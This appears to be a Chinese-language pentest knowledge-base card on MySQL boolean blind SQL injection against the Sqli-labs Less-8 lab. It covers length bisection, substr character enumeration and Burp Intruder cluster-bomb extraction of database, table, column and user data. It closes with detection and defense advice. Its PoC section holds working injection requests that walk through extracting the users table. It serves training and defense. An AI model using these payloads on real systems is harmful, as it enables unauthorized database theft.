---
id: web-generic-sqli-boolean-blind-length-substr-intruder
title: MySQL 布尔盲注标准流程：length 二分定长 + substr 逐字符 + Intruder 集束炸弹批量爆破
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-boolean-blind-extraction-workflow
aliases:
- 布尔盲注流程
- substr 盲注
- Intruder 集束炸弹盲注
- You are in 布尔 oracle
- length database 二分法
- 无显注入
tags:
- sqli
- blind
- boolean
- mysql
- substr
- intruder
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V554
  verified_at: '2026-11-12T00:17:49+08:00'
  notes: 已对照原文与图27-40核对：Less-8 单引号使You are in消失、双引号恢复；length(database())>5/>10/=8二分；Intruder字典s/S响应长度972与其他973；集束炸弹位置1-8×字符字典；表个数4、四个表长6/8/7/5、users列数3、数据13条、首条dumb，均与正文/截图一致；Windows下大小写不敏感与lower_case参数说明一致。dedup除自身外候选均为过滤绕过、闭合发现、大小写修正等不同场景，非同链；dup-scan无相关pair。原文未给组件版本，未设affected_versions；PoC未在本机执行。
---

## 一句话结论

页面不返回查询结果、只存在「正常/异常」两种状态（如 Sqli-labs Less-8 的 `You are in...` 出现与否）时，把这两种状态当布尔 oracle：先用 `and length(database())>N` 二分出库名长度，再用 `substr(database(),位置,1)='字符'` 逐位枚举字符；用 Burp Intruder 集束炸弹把「字符位置」和「字符字典」两个 payload 同时穷举，可以一次爆破出整串库名，之后按「表个数/表长/表名 → 列个数/列长/列名 → 数据个数/数据长度/数据内容」逐层重复同样流程。

## 原理

- **布尔盲注的本质**：注入语句的 WHERE 条件真值会影响结果集是否非空，进而改变页面输出（内容、长度、状态码）。只要这两种状态可区分，就能把任意子查询结果编码成「真/假」逐位读出。
- **长度二分**：`length(database())>5` 为真、`>10` 为假，说明长度在 6-10 之间，继续二分可快速锁定 8；比线性 1..30 探测少一个数量级请求。
- **逐字符枚举**：`substr(字符串,位置,1)='c'` 或 `ascii(substr(...))=NN`；MySQL 库名可用字符为 `a-z A-Z 0-9 _`（63 个），直接字典爆破。
- **集束炸弹（Cluster bomb）**：Burp Intruder 的 Cluster bomb 模式把多个 payload 位置做笛卡尔积——位置 1..N × 字符字典，一次请求集即可覆盖「第几位是什么字符」的全部组合，按响应长度/内容差异筛选正确字符。
- **元数据层级**：表个数用 `(select count(table_name) from information_schema.tables where table_schema=database())`，表名用 `limit N,1` 逐行取；列与数据同理；数据条数用 `count(*)`，内容用 `substr(列,位,1)`。
- **大小写提示**：MySQL 在 Windows 下比较不区分大小写，`s` 与 `S` 会同时命中，不能据此判断真实大小写；Linux 默认区分（由 `lower_case_file_system`/`lower_case_table_names` 控制）。

## 触发条件

- 存在 SQL 注入，但页面不显示查询结果、也不回显数据库错误。
- 页面在「条件真」与「条件假」时存在稳定可区分差异（内容出现/消失、长度变化、状态码不同）。
- `and`、`substr`、`length`、`limit` 等未被完全过滤（被过滤时可换等价函数或编码，见关联卡）。
- 请求频率不受严格限制（盲注请求量大）。

## 利用步骤

1. `?id=1'` 观察页面差异（如 `You are in...` 消失），再加一个 `'` 使其恢复，确认字符型闭合。
2. `1' and length(database())>5--+`、`>10--+` 二分确定库名长度。
3. `1' and substr(database(),1,1)='a'--+` 用 Intruder 字典爆破第一位；或直接用集束炸弹把位置 1-8 × 字符字典一次跑完，按响应长度差异筛出 `security`。
4. `1' and (select count(table_name) from information_schema.tables where table_schema=database())=4--+` 确定表个数。
5. 用 `limit 0,1`/`limit 1,1` 逐个表名，`length((select table_name ... limit N,1))=M` 定长后逐字符猜表名。
6. 对目标表重复列个数、列长度、列名。
7. 对目标列用 `count(*)` 定数据条数，`length((select 列名 from 表 limit N,1))=M` 定每条长度，再逐字符猜内容。

## PoC

```http
# 闭合确认：单引号后 You are in... 消失，再加引号恢复 → 字符型
GET /Less-8/?id=1' HTTP/1.1
GET /Less-8/?id=1'' HTTP/1.1

# 库名长度二分：>5 真、>10 假 → 6..10；最终 =8
GET /Less-8/?id=1' and length(database())>5--+ HTTP/1.1
GET /Less-8/?id=1' and length(database())>10--+ HTTP/1.1
GET /Less-8/?id=1' and length(database())=8--+ HTTP/1.1

# 第一位字符（Burp Intruder 字典 a-zA-Z0-9_）：s/S 命中
GET /Less-8/?id=1' and substr(database(),1,1)='a'--+ HTTP/1.1

# 集束炸弹：位置 1-8 × 字符字典，按响应长度筛选
GET /Less-8/?id=1' and substr(database(),§1§,1)='§a§'--+ HTTP/1.1

# 表个数=4
GET /Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4--+ HTTP/1.1

# 第 1 个表长度=6，逐字符猜出 emails
GET /Less-8/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6--+ HTTP/1.1

# 第 4 个表 users 的列个数=3
GET /Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=3--+ HTTP/1.1

# 数据条数=13，第一条 username 长度=4，内容为 dumb
GET /Less-8/?id=1' and (select count(*) from users)=13--+ HTTP/1.1
GET /Less-8/?id=1' and length((select username from users limit 0,1))=4--+ HTTP/1.1
GET /Less-8/?id=1' and substr((select username from users limit 0,1),1,1)='d'--+ HTTP/1.1
```

## 变体与关联

- 变体：字典受限时用 `ascii(substr(...))>N` 二分 ASCII 值，避免特殊字符无法放入引号；`left()`、`mid()` 可替代 `substr()`。
- 变体：`and/or` 被过滤时用 `&&`/`||`、`xor`、`CASE WHEN`、`ELT`、`GREATEST` 重建 oracle（[[web-generic-sqli-blind-filter-bypass-functions]]）。
- 变体：闭合符不是单引号时，先用 `1'||'1'='1` 与 `1')||(1='1` 对比差分确定真实闭合（[[web-generic-sqli-boolean-blind-parenthesis-closure-discovery]]）。
- 关联：无真假差异时改时间盲注（[[web-generic-sqli-time-blind-if-sleep-intruder]]）；响应差异可从访问日志/pcap 还原（[[web-generic-sqli-blind-log-pcap-response-length-recovery]]）。
- 边界：请求量巨大，易触发频率限制/日志告警；现代 WAF 会按参数重复与布尔表达式模式拦截。

## 检测与防御

- 修复：参数化查询/预编译，禁止拼接；数据库账号最小权限。
- 加固：页面统一响应，避免真/假状态可区分；对同一参数的高频请求、`and`/`substr`/`ascii`/`length` 组合与 `limit` 递增模式做 WAF 规则；查询超时与速率限制。
- 检测：访问日志中同一 URL 参数短时间大量变化（布尔表达式、位置递增、字典遍历），响应长度呈两簇分布；数据库日志中出现 `substr/information_schema/limit` 频繁查询。
